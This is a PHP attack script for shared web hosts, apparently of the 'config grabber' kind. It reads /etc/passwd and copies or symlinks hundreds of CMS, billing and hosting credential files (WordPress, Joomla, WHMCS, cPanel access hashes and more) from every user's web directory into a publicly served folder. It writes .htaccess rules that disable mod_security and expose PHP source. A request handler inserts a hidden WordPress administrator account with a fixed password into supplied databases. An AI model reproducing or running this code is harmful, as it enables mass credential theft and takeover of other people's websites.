<?php
set_time_limit(0);
error_reporting(0);


function query($connect, $prefix, $user) {
    try{
        $id = rand(80, 600);


        $query1 = mysqli_query($connect, "SELECT * FROM " . $prefix . "options where option_name='siteurl'");
        while ($siteurl = mysqli_fetch_array($query1)) {
            $site_url = $siteurl['option_value'];
        }

        $query2 = mysqli_query($connect, "INSERT INTO " . $prefix . "users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ( " . $id . ", '" . $user . "','b69d8af222106f687d7a086c24232387','" . $user . "','support@wordpress.org','','2011-06-07 00:00:00','','0','" . $user . "');");
        $sql1 = mysqli_query($connect, "INSERT INTO " . $prefix . "usermeta (user_id,meta_key,meta_value) VALUES (" . $id . ",'wp_capabilities','a:1:{s:13:\"administrator\";s:1:\"1\";}');");
        $sql2 = mysqli_query($connect, "INSERT INTO " . $prefix . "usermeta (user_id,meta_key,meta_value) VALUES (" . $id . ",'wp_user_level','10');");
        $sql3 = mysqli_query($connect, "INSERT INTO " . $prefix . "usermeta (user_id,meta_key,meta_value) VALUES (" . $id . ",'" . $prefix . "capabilities','a:1:{s:13:\"administrator\";s:1:\"1\";}');");
        $sql4 = mysqli_query($connect, "INSERT INTO " . $prefix . "usermeta (user_id,meta_key,meta_value) VALUES (" . $id . ",'" . $prefix . "user_level','10');");
        if ($query1 && $query2 && $sql1 && $sql2) {
            echo "$site_url/wp-login.php," . $user . ",StrongPass154$$\n";
        }
        // else{
        //     echo $site_url;
        // }
    }catch (Exception $e){
        // do nothing... php will ignore and continue    
    }
}

if (isset($_GET['change'])) {
    $lines = explode("\n", $_POST['config']);
    foreach ($lines as $line) {
        try{
            $data   = explode(',', $line);

            $host   = $data[0];
            $user   = $data[1];
            $pass   = $data[2];
            $name   = $data[3];
            $prefix = $data[4];
            //  echo $host .' '. $user .' '. $pass .' '. $name;

            $connect = mysqli_connect($host, $user, $pass, $name);
            if ($connect) {

                $check_availability = mysqli_query($connect, "SELECT * FROM " . $prefix . "users WHERE (user_login = 'Administrator' OR user_login = 'Wpadmin') AND (user_pass = 'b69d8af222106f687d7a086c24232387' OR user_pass = '\$P\$B/BHu2715erD4cr2tF0p5QXanN6PqS1');");

                if (mysqli_num_rows($check_availability) < 1) {
                    query($connect, $prefix, 'Administrator');
                }
                mysqli_close($connect);
            }
        }catch (Exception $e){
            // do nothing... php will ignore and continue    
        }

    }

    die();
}

function save($filename, $mode, $file) {
      $handle = fopen($filename, $mode);
      fwrite($handle, $file);
      fclose($handle);
      return;
}

function getuser() {
      $fopen = fopen("/etc/passwd", "r") or die("Can't read /etc/passwd");
      while($read = fgets($fopen)) {
            preg_match_all('/(.*?):x:/', $read, $getuser);
            $user[] = $getuser[1][0];
      }
      return $user;
}

@mkdir('idx_config', 0755);
$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
save("idx_config/.htaccess","w", $htaccess);

foreach(getuser() as $user) {
    $user_docroot = "/home/$user/public_html/";
    if(is_readable($user_docroot)) {
        $getconfig = array(
            "/home/$user/.accesshash" => "WHM-accesshash",
            "$user_docroot/config/koneksi.php" => "Lokomedia",
            "$user_docroot/forum/config.php" => "phpBB",
            "$user_docroot/sites/default/settings.php" => "Drupal",
            "$user_docroot/config/settings.inc.php" => "PrestaShop",
            "$user_docroot/app/etc/local.xml" => "Magento",
            "$user_docroot/admin/config.php" => "OpenCart",
            "$user_docroot/application/config/database.php" => "Ellislab",
            "$user_docroot/vb/includes/config.php" => "Vbulletin",
            "$user_docroot/includes/config.php" => "Vbulletin",
            "$user_docroot/forum/includes/config.php" => "Vbulletin",
            "$user_docroot/forums/includes/config.php" => "Vbulletin",
            "$user_docroot/cc/includes/config.php" => "Vbulletin",
            "$user_docroot/inc/config.php" => "MyBB",
            "$user_docroot/includes/configure.php" => "OsCommerce",
            "$user_docroot/shop/includes/configure.php" => "OsCommerce",
            "$user_docroot/os/includes/configure.php" => "OsCommerce",
            "$user_docroot/oscom/includes/configure.php" => "OsCommerce",
            "$user_docroot/products/includes/configure.php" => "OsCommerce",
            "$user_docroot/cart/includes/configure.php" => "OsCommerce",
            "$user_docroot/inc/conf_global.php" => "IPB",
            "$user_docroot/wp-config.php" => "Wordpress",
            "$user_docroot/wp/test/wp-config.php" => "Wordpress",
            "$user_docroot/blog/wp-config.php" => "Wordpress",
            "$user_docroot/beta/wp-config.php" => "Wordpress",
            "$user_docroot/portal/wp-config.php" => "Wordpress",
            "$user_docroot/site/wp-config.php" => "Wordpress",
            "$user_docroot/wp/wp-config.php" => "Wordpress",
            "$user_docroot/WP/wp-config.php" => "Wordpress",
            "$user_docroot/news/wp-config.php" => "Wordpress",
            "$user_docroot/wordpress/wp-config.php" => "Wordpress",
            "$user_docroot/test/wp-config.php" => "Wordpress",
            "$user_docroot/demo/wp-config.php" => "Wordpress",
            "$user_docroot/home/wp-config.php" => "Wordpress",
            "$user_docroot/v1/wp-config.php" => "Wordpress",
            "$user_docroot/v2/wp-config.php" => "Wordpress",
            "$user_docroot/press/wp-config.php" => "Wordpress",
            "$user_docroot/new/wp-config.php" => "Wordpress",
            "$user_docroot/blogs/wp-config.php" => "Wordpress",
            "$user_docroot/configuration.php" => "Joomla",
            "$user_docroot/blog/configuration.php" => "Joomla",
            "$user_docroot/submitticket.php" => "^WHMCS",
            "$user_docroot/cms/configuration.php" => "Joomla",
            "$user_docroot/beta/configuration.php" => "Joomla",
            "$user_docroot/portal/configuration.php" => "Joomla",
            "$user_docroot/site/configuration.php" => "Joomla",
            "$user_docroot/main/configuration.php" => "Joomla",
            "$user_docroot/home/configuration.php" => "Joomla",
            "$user_docroot/demo/configuration.php" => "Joomla",
            "$user_docroot/test/configuration.php" => "Joomla",
            "$user_docroot/v1/configuration.php" => "Joomla",
            "$user_docroot/v2/configuration.php" => "Joomla",
            "$user_docroot/joomla/configuration.php" => "Joomla",
            "$user_docroot/new/configuration.php" => "Joomla",
            "$user_docroot/WHMCS/submitticket.php" => "WHMCS",
            "$user_docroot/whmcs1/submitticket.php" => "WHMCS",
            "$user_docroot/Whmcs/submitticket.php" => "WHMCS",
            "$user_docroot/whmcs/submitticket.php" => "WHMCS",
            "$user_docroot/whmcs/submitticket.php" => "WHMCS",
            "$user_docroot/WHMC/submitticket.php" => "WHMCS",
            "$user_docroot/Whmc/submitticket.php" => "WHMCS",
            "$user_docroot/whmc/submitticket.php" => "WHMCS",
            "$user_docroot/WHM/submitticket.php" => "WHMCS",
            "$user_docroot/Whm/submitticket.php" => "WHMCS",
            "$user_docroot/whm/submitticket.php" => "WHMCS",
            "$user_docroot/HOST/submitticket.php" => "WHMCS",
            "$user_docroot/Host/submitticket.php" => "WHMCS",
            "$user_docroot/host/submitticket.php" => "WHMCS",
            "$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
            "$user_docroot/Supportes/submitticket.php" => "WHMCS",
            "$user_docroot/supportes/submitticket.php" => "WHMCS",
            "$user_docroot/domains/submitticket.php" => "WHMCS",
            "$user_docroot/domain/submitticket.php" => "WHMCS",
            "$user_docroot/Hosting/submitticket.php" => "WHMCS",
            "$user_docroot/HOSTING/submitticket.php" => "WHMCS",
            "$user_docroot/hosting/submitticket.php" => "WHMCS",
            "$user_docroot/CART/submitticket.php" => "WHMCS",
            "$user_docroot/Cart/submitticket.php" => "WHMCS",
            "$user_docroot/cart/submitticket.php" => "WHMCS",
            "$user_docroot/ORDER/submitticket.php" => "WHMCS",
            "$user_docroot/Order/submitticket.php" => "WHMCS",
            "$user_docroot/order/submitticket.php" => "WHMCS",
            "$user_docroot/CLIENT/submitticket.php" => "WHMCS",
            "$user_docroot/Client/submitticket.php" => "WHMCS",
            "$user_docroot/client/submitticket.php" => "WHMCS",
            "$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
            "$user_docroot/Clientarea/submitticket.php" => "WHMCS",
            "$user_docroot/clientarea/submitticket.php" => "WHMCS",
            "$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
            "$user_docroot/Support/submitticket.php" => "WHMCS",
            "$user_docroot/support/submitticket.php" => "WHMCS",
            "$user_docroot/BILLING/submitticket.php" => "WHMCS",
            "$user_docroot/Billing/submitticket.php" => "WHMCS",
            "$user_docroot/billing/submitticket.php" => "WHMCS",
            "$user_docroot/BUY/submitticket.php" => "WHMCS",
            "$user_docroot/Buy/submitticket.php" => "WHMCS",
            "$user_docroot/buy/submitticket.php" => "WHMCS",
            "$user_docroot/MANAGE/submitticket.php" => "WHMCS",
            "$user_docroot/Manage/submitticket.php" => "WHMCS",
            "$user_docroot/manage/submitticket.php" => "WHMCS",
            "$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
            "$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
            "$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
            "$user_docroot/clientsupport/submitticket.php" => "WHMCS",
            "$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
            "$user_docroot/Checkout/submitticket.php" => "WHMCS",
            "$user_docroot/checkout/submitticket.php" => "WHMCS",
            "$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
            "$user_docroot/Billings/submitticket.php" => "WHMCS",
            "$user_docroot/billings/submitticket.php" => "WHMCS",
            "$user_docroot/BASKET/submitticket.php" => "WHMCS",
            "$user_docroot/Basket/submitticket.php" => "WHMCS",
            "$user_docroot/basket/submitticket.php" => "WHMCS",
            "$user_docroot/SECURE/submitticket.php" => "WHMCS",
            "$user_docroot/Secure/submitticket.php" => "WHMCS",
            "$user_docroot/secure/submitticket.php" => "WHMCS",
            "$user_docroot/SALES/submitticket.php" => "WHMCS",
            "$user_docroot/Sales/submitticket.php" => "WHMCS",
            "$user_docroot/sales/submitticket.php" => "WHMCS",
            "$user_docroot/BILL/submitticket.php" => "WHMCS",
            "$user_docroot/Bill/submitticket.php" => "WHMCS",
            "$user_docroot/bill/submitticket.php" => "WHMCS",
            "$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
            "$user_docroot/Purchase/submitticket.php" => "WHMCS",
            "$user_docroot/purchase/submitticket.php" => "WHMCS",
            "$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
            "$user_docroot/Account/submitticket.php" => "WHMCS",
            "$user_docroot/account/submitticket.php" => "WHMCS",
            "$user_docroot/USER/submitticket.php" => "WHMCS",
            "$user_docroot/User/submitticket.php" => "WHMCS",
            "$user_docroot/user/submitticket.php" => "WHMCS",
            "$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
            "$user_docroot/Clients/submitticket.php" => "WHMCS",
            "$user_docroot/clients/submitticket.php" => "WHMCS",
            "$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
            "$user_docroot/Billings/submitticket.php" => "WHMCS",
            "$user_docroot/billings/submitticket.php" => "WHMCS",
            "$user_docroot/MY/submitticket.php" => "WHMCS",
            "$user_docroot/My/submitticket.php" => "WHMCS",
            "$user_docroot/my/submitticket.php" => "WHMCS",
            "$user_docroot/secure/whm/submitticket.php" => "WHMCS",
            "$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
            "$user_docroot/panel/submitticket.php" => "WHMCS",
            "$user_docroot/clientes/submitticket.php" => "WHMCS",
            "$user_docroot/cliente/submitticket.php" => "WHMCS",
            "$user_docroot/support/order/submitticket.php" => "WHMCS",
            "$user_docroot/bb-config.php" => "BoxBilling",
            "$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
            "$user_docroot/box/bb-config.php" => "BoxBilling",
            "$user_docroot/host/bb-config.php" => "BoxBilling",
            "$user_docroot/Host/bb-config.php" => "BoxBilling",
            "$user_docroot/supportes/bb-config.php" => "BoxBilling",
            "$user_docroot/support/bb-config.php" => "BoxBilling",
            "$user_docroot/hosting/bb-config.php" => "BoxBilling",
            "$user_docroot/cart/bb-config.php" => "BoxBilling",
            "$user_docroot/order/bb-config.php" => "BoxBilling",
            "$user_docroot/client/bb-config.php" => "BoxBilling",
            "$user_docroot/clients/bb-config.php" => "BoxBilling",
            "$user_docroot/cliente/bb-config.php" => "BoxBilling",
            "$user_docroot/clientes/bb-config.php" => "BoxBilling",
            "$user_docroot/billing/bb-config.php" => "BoxBilling",
            "$user_docroot/billings/bb-config.php" => "BoxBilling",
            "$user_docroot/my/bb-config.php" => "BoxBilling",
            "$user_docroot/secure/bb-config.php" => "BoxBilling",
            "$user_docroot/support/order/bb-config.php" => "BoxBilling",
            "$user_docroot/includes/dist-configure.php" => "Zencart",
            "$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
            "$user_docroot/products/includes/dist-configure.php" => "Zencart",
            "$user_docroot/cart/includes/dist-configure.php" => "Zencart",
            "$user_docroot/shop/includes/dist-configure.php" => "Zencart",
            "$user_docroot/includes/iso4217.php" => "Hostbills",
            "$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
            "$user_docroot/host/includes/iso4217.php" => "Hostbills",
            "$user_docroot/Host/includes/iso4217.php" => "Hostbills",
            "$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
            "$user_docroot/support/includes/iso4217.php" => "Hostbills",
            "$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
            "$user_docroot/cart/includes/iso4217.php" => "Hostbills",
            "$user_docroot/order/includes/iso4217.php" => "Hostbills",
            "$user_docroot/client/includes/iso4217.php" => "Hostbills",
            "$user_docroot/clients/includes/iso4217.php" => "Hostbills",
            "$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
            "$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
            "$user_docroot/billing/includes/iso4217.php" => "Hostbills",
            "$user_docroot/billings/includes/iso4217.php" => "Hostbills",
            "$user_docroot/my/includes/iso4217.php" => "Hostbills",
            "$user_docroot/secure/includes/iso4217.php" => "Hostbills",
            "$user_docroot/support/order/includes/iso4217.php" => "Hostbills"

        );
        foreach($getconfig as $config => $userconfig) {
            $get = file_get_contents($config);
            if($get == '') {
            }
            else {
                $fopen = fopen("idx_config/$user-$userconfig.txt", "w");
                fputs($fopen, $get);
            }
        }
	}
}


@mkdir("xBlack_Configs", 0755);
@chdir("xBlack_Configs");
$htaccess="
Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
<IfModule mod_autoindex.c>
IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble
</ifModule>
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);

$passwd=explode("\n",file_get_contents('/etc/passwd'));
foreach($passwd as $pwd){
      $pawd=explode(":",$pwd);
      $user =$pawd[0];
      @symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
      @symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
      @symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
      @symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
      @symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
      @symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
      @symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
      @symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
      @symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
      @symlink('/home/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
      @symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
      @symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
      @symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
      @symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
      @symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
      @symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
      @symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
      @symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
      @symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
      @symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
      @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
      @symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
      @symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
      @symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
      @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
      @symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
      @symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
      @symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
      @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
      @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
      @symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
      @symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
      @symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
      @symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
      @symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
      @symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
      @symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
      @symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
      @symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
      @symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
      @symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
      @symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
      @symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
      @symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
      @symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
      @symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
      @symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
      @symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
      @symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
      @symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
      @symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
      @symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
      @symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
      @symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
      @symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
      @symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
      @symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
      @symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
      @symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
      @symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
      @symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
      @symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
      @symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
      @symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
      @symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
      @symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
      @symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
      @symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
      @symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
      @symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
      @symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
      @symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
      @symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
      @symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
      @symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
      @symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
      @symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
      @symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
      @symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
      @symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
      @symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
      @symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
      @symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
      @symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
      @symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
      @symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
      @symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
      @symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
      @symlink('/home/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
}

?>